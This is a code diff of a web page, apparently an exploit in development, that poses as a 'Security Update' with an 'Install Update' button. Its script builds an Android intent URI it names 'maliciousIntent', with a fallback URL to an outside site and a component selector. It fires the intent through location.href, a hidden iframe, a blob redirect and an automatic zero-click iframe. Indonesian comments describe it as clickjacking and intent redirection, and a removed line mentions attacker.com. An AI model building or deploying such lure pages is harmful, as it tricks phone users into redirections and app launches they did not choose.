@@ -28,7 +28,7 @@
     margin-top: 20px; background: #000; color: #0f0;
     padding: 10px; font-family: monospace; font-size: 12px;
     border-radius: 6px; width: 100%; max-width: 400px;
-    height: 100px; overflow-y: auto; text-align: left;
+    height: 120px; overflow-y: auto; text-align: left;
   }
 </style>
 </head>
@@ -37,8 +37,6 @@
 <div class="panel">
   <h1>🔒 Security Update</h1>
   <p>Klik tombol di bawah untuk memperbarui sistem.</p>
-  
-  <!-- Tombol Pemicu Intent Redirection -->
   <button id="intentBtn">Install Update</button>
 </div>
 
@@ -55,46 +53,53 @@
   }
 
   // ============================================
-  // 1. INTENT REDIRECTION VECTOR (ANDROID)
+  // 1. KONFIGURASI PAYLOAD (INTENT INJECTION)
   // ============================================
-  // Format umum: intent://host#Intent;scheme=...;package=...;end
-  // Celah: Beberapa browser Android mengizinkan Intent ke package internal
-  // tanpa verifikasi.
+  // URL Fallback: Jika aplikasi ZXing tidak terinstal, 
+  // Chrome akan mencoba membuka URL ini.
+  var zombieStreamUrl = "https://artha231.github.io/";
   
-  // Target: Android Settings (Bisa digunakan untuk eksploitasi lebih lanjut)
-  // Atau: intent://webview?url=https://attacker.com#Intent;package=com.android.chrome;end
-  
-  var targetIntent = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
-  // Atau gunakan: intent://settings#Intent;action=android.settings.SETTINGS;end
+  // Encode URL fallback dengan benar (perbaikan typo)
+  var encodedFallback = encodeURIComponent(zombieStreamUrl);
+
+  // Intent yang dimodifikasi
+  // Catatan: Format Intent URI di Android harus tepat agar valid.
+  var maliciousIntent = "intent://scan/#Intent;" +
+                        "scheme=zxing;" +
+                        "package=com.google.zxing.client.android;" +
+                        "S.browser_fallback_url=" + encodedFallback + ";" +
+                        "SEL.component=com.google.zxing.client.android/.ScanActivity;" +
+                        "end";
+
+  console.log("Malicious Intent: " + maliciousIntent);
 
   // ============================================
   // 2. EKSEKUSI (Clickjacking / One Click)
   // ============================================
   document.getElementById('intentBtn').addEventListener('click', function() {
-    log("[!] Memicu Intent Redirection...");
+    log("[!] Memicu Intent Redirection (Component + Fallback)...");
     
     // Trik 1: Location.href (Langsung)
     try {
-      window.location.href = targetIntent;
+      window.location.href = maliciousIntent;
       log("[+] Intent dieksekusi via location.href.");
     } catch(e) {
       log("[-] Gagal: " + e.message);
     }
 
-    // Trik 2: Iframe tersembunyi (Zero-Click Iframe)
+    // Trik 2: Iframe tersembunyi (Fallback Redirect)
     setTimeout(function() {
       var iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = targetIntent;
+      iframe.src = maliciousIntent;
       document.body.appendChild(iframe);
       log("[+] Intent via Iframe dicoba.");
     }, 500);
 
-    // Trik 3: Blob Wrapper (Untuk iOS/Safari)
-    // Safari kadang membuka intent dari blob: URL
+    // Trik 3: Blob Wrapper
     setTimeout(function() {
       try {
-        var blobPayload = `<script>window.location.href = "${targetIntent}";<\/script>`;
+        var blobPayload = `<script>window.location.href = "${maliciousIntent}";<\/script>`;
         var blob = new Blob([blobPayload], { type: 'text/html' });
         var url = URL.createObjectURL(blob);
         window.location.replace(url);
@@ -104,16 +109,14 @@
   });
 
   // ============================================
-  // 3. ZERO-CLICK ATTEMPT (Diblokir Browser Modern)
+  // 3. ZERO-CLICK ATTEMPT
   // ============================================
-  // Mencoba mengeksekusi Intent tanpa klik (Zero-Click)
   setTimeout(function() {
     log("[Zero-Click] Mencoba Intent tanpa klik...");
     var iframe = document.createElement('iframe');
     iframe.style.display = 'none';
-    iframe.src = targetIntent;
+    iframe.src = maliciousIntent;
     document.body.appendChild(iframe);
-    // (Chrome Android akan memblokir ini secara senyap)
   }, 2000);
 
 })();
